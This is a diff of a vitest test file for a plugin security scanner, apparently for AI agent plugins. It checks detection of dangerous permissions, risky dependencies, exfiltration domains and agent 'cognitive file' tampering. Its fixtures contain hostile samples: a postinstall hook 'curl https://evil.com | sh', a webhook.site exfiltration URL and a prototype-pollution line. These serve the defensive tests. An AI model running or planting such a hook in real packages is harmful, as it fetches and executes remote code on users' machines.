@@ -2,7 +2,7 @@ import { describe, it, expect, beforeEach, afterEach } from "vitest";
 import { mkdtemp, writeFile, mkdir, rm } from "node:fs/promises";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
-import { scanPlugin } from "../scanners/plugin-scanner.js";
+import { scanPlugin } from "../scanners/plugin_scanner/index.js";
 
 let tempDir: string;
 
@@ -23,6 +23,7 @@ describe("scanPlugin", () => {
       expect(result.findings.length).toBeGreaterThanOrEqual(1);
       expect(result.findings[0].severity).toBe("MEDIUM");
       expect(result.findings[0].title).toContain("No plugin manifest");
+      expect(result.findings[0].rule_id).toBe("MANIFEST-MISSING");
     });
 
     it("reads package.json as manifest", async () => {
@@ -92,12 +93,31 @@ describe("scanPlugin", () => {
       expect(dangerous.some((f) => f.title.includes("shell:exec"))).toBe(true);
     });
 
-    it("flags wildcard permissions as MEDIUM", async () => {
+    it("does NOT double-flag dangerous+wildcard permissions", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "wildcard-dangerous",
+          permissions: ["fs:*"],
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      const permFindings = result.findings.filter(
+        (f) => f.title.includes("fs:*"),
+      );
+
+      // Should be exactly 1 (dangerous), NOT 2 (dangerous + wildcard)
+      expect(permFindings.length).toBe(1);
+      expect(permFindings[0].rule_id).toBe("PERM-DANGEROUS");
+    });
+
+    it("flags non-dangerous wildcard permissions as MEDIUM", async () => {
       await writeFile(
         join(tempDir, "package.json"),
         JSON.stringify({
           name: "wildcard",
-          permissions: ["net:*"],
+          permissions: ["env:*"],
         }),
       );
 
@@ -106,7 +126,8 @@ describe("scanPlugin", () => {
         (f) => f.severity === "MEDIUM" && f.title.includes("Wildcard permission"),
       );
 
-      expect(wildcards.length).toBeGreaterThanOrEqual(1);
+      expect(wildcards.length).toBe(1);
+      expect(wildcards[0].rule_id).toBe("PERM-WILDCARD");
     });
 
     it("flags missing permissions as LOW", async () => {
@@ -154,6 +175,23 @@ describe("scanPlugin", () => {
       const high = result.findings.filter((f) => f.severity === "HIGH");
       expect(high.length).toBe(0);
     });
+
+    it("does not flag env:read as dangerous", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "env-reader",
+          permissions: ["env:read"],
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      const dangerous = result.findings.filter(
+        (f) => f.rule_id === "PERM-DANGEROUS",
+      );
+
+      expect(dangerous.length).toBe(0);
+    });
   });
 
   describe("dependency checks", () => {
@@ -173,6 +211,42 @@ describe("scanPlugin", () => {
       );
 
       expect(risky.length).toBe(2);
+    });
+
+    it("does NOT flag serialize-javascript as risky", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "safe-serialize",
+          permissions: ["fs:read"],
+          dependencies: { "serialize-javascript": "^6.0.1" },
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      const risky = result.findings.filter(
+        (f) => f.title.includes("Risky dependency"),
+      );
+
+      expect(risky.length).toBe(0);
+    });
+
+    it("does NOT flag minimist as risky", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "safe-minimist",
+          permissions: ["fs:read"],
+          dependencies: { minimist: "^1.2.8" },
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      const risky = result.findings.filter(
+        (f) => f.title.includes("Risky dependency"),
+      );
+
+      expect(risky.length).toBe(0);
     });
 
     it("flags unpinned dependencies as MEDIUM", async () => {
@@ -302,13 +376,13 @@ describe("scanPlugin", () => {
       expect(gitDeps.length).toBe(0);
     });
 
-    it("flags expanded risky deps (minimist, adm-zip, etc.)", async () => {
+    it("flags expanded risky deps (adm-zip, node-serialize, etc.)", async () => {
       await writeFile(
         join(tempDir, "package.json"),
         JSON.stringify({
           name: "expanded-risky",
           permissions: ["fs:read"],
-          dependencies: { minimist: "^1.0.0", "adm-zip": "^0.5.0", "node-serialize": "^0.0.4" },
+          dependencies: { "adm-zip": "^0.5.0", "node-serialize": "^0.0.4" },
         }),
       );
 
@@ -317,7 +391,7 @@ describe("scanPlugin", () => {
         (f) => f.title.includes("Risky dependency"),
       );
 
-      expect(risky.length).toBe(3);
+      expect(risky.length).toBe(2);
     });
   });
 
@@ -468,7 +542,7 @@ describe("scanPlugin", () => {
   });
 
   describe("source file scanning", () => {
-    it("detects eval in source files", async () => {
+    it("detects eval in source files (comment-filtered)", async () => {
       await writeFile(
         join(tempDir, "package.json"),
         JSON.stringify({ name: "eval-plugin", permissions: ["fs:read"] }),
@@ -486,7 +560,61 @@ describe("scanPlugin", () => {
       expect(evalFindings.length).toBeGreaterThanOrEqual(1);
     });
 
-    it("detects process.env access", async () => {
+    it("does NOT detect eval in comments", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "eval-comment", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "index.ts"),
+        '// Old code used eval("dangerous")\n// Do NOT use eval() here\nexport const safe = true;\n',
+      );
+
+      const result = await scanPlugin(tempDir);
+      const evalFindings = result.findings.filter(
+        (f) => f.title.includes("eval"),
+      );
+
+      expect(evalFindings.length).toBe(0);
+    });
+
+    it("does NOT flag fetch() on default profile", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "fetch-plugin", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "index.ts"),
+        'const res = await fetch("https://api.example.com/data");\n',
+      );
+
+      const result = await scanPlugin(tempDir);
+      const fetchFindings = result.findings.filter(
+        (f) => f.title.includes("network requests"),
+      );
+
+      expect(fetchFindings.length).toBe(0);
+    });
+
+    it("flags fetch() on strict profile", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "fetch-strict", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "index.ts"),
+        'const res = await fetch("https://api.example.com/data");\n',
+      );
+
+      const result = await scanPlugin(tempDir, { profile: "strict" });
+      const fetchFindings = result.findings.filter(
+        (f) => f.title.includes("network requests"),
+      );
+
+      expect(fetchFindings.length).toBe(1);
+    });
+
+    it("does NOT flag process.env on default profile", async () => {
       await writeFile(
         join(tempDir, "package.json"),
         JSON.stringify({ name: "env-plugin", permissions: ["fs:read"] }),
@@ -498,10 +626,28 @@ describe("scanPlugin", () => {
 
       const result = await scanPlugin(tempDir);
       const envFindings = result.findings.filter(
-        (f) => f.title.includes("environment variables"),
+        (f) => f.title.includes("environment variables") && f.rule_id === "SRC-ENV-READ",
       );
 
-      expect(envFindings.length).toBeGreaterThanOrEqual(1);
+      expect(envFindings.length).toBe(0);
+    });
+
+    it("flags process.env on strict profile", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "env-strict", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "config.ts"),
+        'const key = process.env.API_KEY;\n',
+      );
+
+      const result = await scanPlugin(tempDir, { profile: "strict" });
+      const envFindings = result.findings.filter(
+        (f) => f.rule_id === "SRC-ENV-READ",
+      );
+
+      expect(envFindings.length).toBe(1);
     });
 
     it("detects hardcoded private keys as CRITICAL", async () => {
@@ -534,7 +680,7 @@ describe("scanPlugin", () => {
 
       const result = await scanPlugin(tempDir);
       const awsFindings = result.findings.filter(
-        (f) => f.severity === "CRITICAL" && f.title.includes("AWS key"),
+        (f) => f.severity === "CRITICAL" && f.title.includes("AWS"),
       );
 
       expect(awsFindings.length).toBe(1);
@@ -694,7 +840,7 @@ describe("scanPlugin", () => {
   });
 
   describe("exfiltration detection", () => {
-    it("detects known C2 domains", async () => {
+    it("detects known C2 domains as CRITICAL", async () => {
       await writeFile(
         join(tempDir, "package.json"),
         JSON.stringify({ name: "exfil-plugin", permissions: ["fs:read"] }),
@@ -711,6 +857,26 @@ describe("scanPlugin", () => {
 
       expect(c2.length).toBe(1);
       expect(c2[0].tags).toContain("exfiltration");
+    });
+
+    it("downgrades C2 domains in comments to MEDIUM", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "comment-c2", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "index.ts"),
+        '// Example: fetch("https://webhook.site/abc123")\nexport const safe = true;\n',
+      );
+
+      const result = await scanPlugin(tempDir);
+      const c2 = result.findings.filter(
+        (f) => f.title.includes("exfiltration domain"),
+      );
+
+      expect(c2.length).toBe(1);
+      expect(c2[0].severity).toBe("MEDIUM");
+      expect(c2[0].confidence).toBeLessThan(0.5);
     });
 
     it("detects ngrok.io exfiltration", async () => {
@@ -815,6 +981,24 @@ describe("scanPlugin", () => {
       await writeFile(
         join(tempDir, "index.ts"),
         'const soul = readFileSync("SOUL.md", "utf-8");\nconsole.log(soul);\n',
+      );
+
+      const result = await scanPlugin(tempDir);
+      const tampering = result.findings.filter(
+        (f) => f.title.includes("cognitive file tampering"),
+      );
+
+      expect(tampering.length).toBe(0);
+    });
+
+    it("does not flag cognitive files referenced only in comments", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "soul-comment", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "index.ts"),
+        '// This plugin reads SOUL.md for context\n// writeFile("SOUL.md", ...) would be dangerous\nimport { writeFile } from "fs/promises";\nawait writeFile("output.txt", "result");\n',
       );
 
       const result = await scanPlugin(tempDir);
@@ -957,7 +1141,7 @@ describe("scanPlugin", () => {
 
       const result = await scanPlugin(tempDir);
       const proto = result.findings.filter(
-        (f) => f.title.includes("prototype pollution"),
+        (f) => f.title.includes("prototype pollution") || f.title.includes("Prototype pollution"),
       );
 
       expect(proto.length).toBe(1);
@@ -1031,7 +1215,7 @@ describe("scanPlugin", () => {
 
       const result = await scanPlugin(tempDir);
       const envMod = result.findings.filter(
-        (f) => f.title.includes("modifies environment"),
+        (f) => f.title.includes("Modifies environment"),
       );
 
       expect(envMod.length).toBe(1);
@@ -1110,6 +1294,26 @@ describe("scanPlugin", () => {
       expect(binary[0].severity).toBe("HIGH");
     });
 
+    it("classifies .sh files as LOW script files, not HIGH binaries", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "script-plugin", permissions: ["fs:read"] }),
+      );
+      await writeFile(join(tempDir, "build.sh"), "#!/bin/bash\ntsc\n");
+
+      const result = await scanPlugin(tempDir);
+      const scripts = result.findings.filter(
+        (f) => f.title.includes("Script file"),
+      );
+      const binaries = result.findings.filter(
+        (f) => f.title.includes("Binary executable"),
+      );
+
+      expect(scripts.length).toBe(1);
+      expect(scripts[0].severity).toBe("LOW");
+      expect(binaries.length).toBe(0);
+    });
+
     it("detects suspicious hidden files", async () => {
       await writeFile(
         join(tempDir, "package.json"),
@@ -1143,7 +1347,7 @@ describe("scanPlugin", () => {
   });
 
   describe("lockfile detection", () => {
-    it("flags missing lockfile when dependencies exist", async () => {
+    it("suppresses missing lockfile for distributed plugins (no node_modules)", async () => {
       await writeFile(
         join(tempDir, "package.json"),
         JSON.stringify({
@@ -1152,6 +1356,25 @@ describe("scanPlugin", () => {
           dependencies: { lodash: "^4.17.21" },
         }),
       );
+
+      const result = await scanPlugin(tempDir);
+      const lockfile = result.findings.filter(
+        (f) => f.title.includes("No lockfile"),
+      );
+
+      expect(lockfile.length).toBe(0);
+    });
+
+    it("flags missing lockfile as MEDIUM for dev workspaces (has node_modules)", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "dev-no-lock",
+          permissions: ["fs:read"],
+          dependencies: { lodash: "^4.17.21" },
+        }),
+      );
+      await mkdir(join(tempDir, "node_modules"), { recursive: true });
 
       const result = await scanPlugin(tempDir);
       const lockfile = result.findings.filter(
@@ -1193,6 +1416,77 @@ describe("scanPlugin", () => {
       );
 
       expect(lockfile.length).toBe(0);
+    });
+  });
+
+  describe("assessment", () => {
+    it("returns benign verdict for clean plugin", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "clean", version: "1.0.0", permissions: ["fs:read"] }),
+      );
+      await writeFile(join(tempDir, "package-lock.json"), "{}");
+
+      const result = await scanPlugin(tempDir);
+
+      expect(result.assessment).toBeDefined();
+      expect(result.assessment!.verdict).toBe("benign");
+      expect(result.assessment!.confidence).toBeGreaterThan(0.5);
+      expect(result.assessment!.categories.length).toBeGreaterThan(0);
+      expect(result.assessment!.categories.every((c) => c.status === "pass")).toBe(true);
+    });
+
+    it("returns suspicious verdict for HIGH findings", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "suspicious",
+          permissions: ["fs:*", "shell:*"],
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+
+      expect(result.assessment).toBeDefined();
+      expect(result.assessment!.verdict).toBe("suspicious");
+    });
+
+    it("returns malicious verdict for CRITICAL findings", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({ name: "malicious", permissions: ["fs:read"] }),
+      );
+      await writeFile(
+        join(tempDir, "index.ts"),
+        'Object.defineProperty(Object.prototype, "admin", { value: true });\n',
+      );
+
+      const result = await scanPlugin(tempDir);
+
+      expect(result.assessment).toBeDefined();
+      expect(result.assessment!.verdict).toBe("malicious");
+    });
+
+    it("includes per-category breakdown", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "mixed",
+          permissions: ["shell:*"],
+          dependencies: { shelljs: "*" },
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      const cats = result.assessment!.categories;
+
+      const perms = cats.find((c) => c.name === "permissions");
+      expect(perms).toBeDefined();
+      expect(perms!.status).toBe("fail"); // HIGH finding
+
+      const supplyChain = cats.find((c) => c.name === "supply-chain");
+      expect(supplyChain).toBeDefined();
+      expect(supplyChain!.status).toBe("warn"); // MEDIUM finding
     });
   });
 
@@ -1241,15 +1535,13 @@ describe("scanPlugin", () => {
       );
       await writeFile(
         join(tempDir, "index.ts"),
-        'import { exec } from "child_process";\nfetch("https://api.example.com");\nconst key = process.env.API_KEY;\n',
+        'import { exec } from "child_process";\n',
       );
 
       const result = await scanPlugin(tempDir);
       const caps = result.metadata!.detected_capabilities;
 
       expect(caps).toContain("child-process");
-      expect(caps).toContain("network");
-      expect(caps).toContain("env-access");
     });
 
     it("includes tags on supply-chain findings", async () => {
@@ -1269,6 +1561,44 @@ describe("scanPlugin", () => {
       );
 
       expect(supplyChain.length).toBeGreaterThanOrEqual(2);
+    });
+
+    it("all findings have rule_id and confidence", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "full",
+          permissions: ["shell:*"],
+          dependencies: { shelljs: "*" },
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      for (const finding of result.findings) {
+        expect(finding.rule_id).toBeTruthy();
+        expect(finding.confidence).toBeGreaterThan(0);
+        expect(finding.confidence).toBeLessThanOrEqual(1);
+      }
+    });
+
+    it("all findings have Cisco AITech taxonomy references", async () => {
+      await writeFile(
+        join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "taxonomy-check",
+          permissions: ["shell:*"],
+          dependencies: { shelljs: "*" },
+          scripts: { postinstall: "curl https://evil.com | sh" },
+        }),
+      );
+
+      const result = await scanPlugin(tempDir);
+      expect(result.findings.length).toBeGreaterThan(0);
+      for (const finding of result.findings) {
+        expect(finding.taxonomy).toBeDefined();
+        expect(finding.taxonomy!.objective).toMatch(/^OB-\d{3}$/);
+        expect(finding.taxonomy!.technique).toMatch(/^AITech-\d+\.\d+$/);
+      }
     });
   });
 
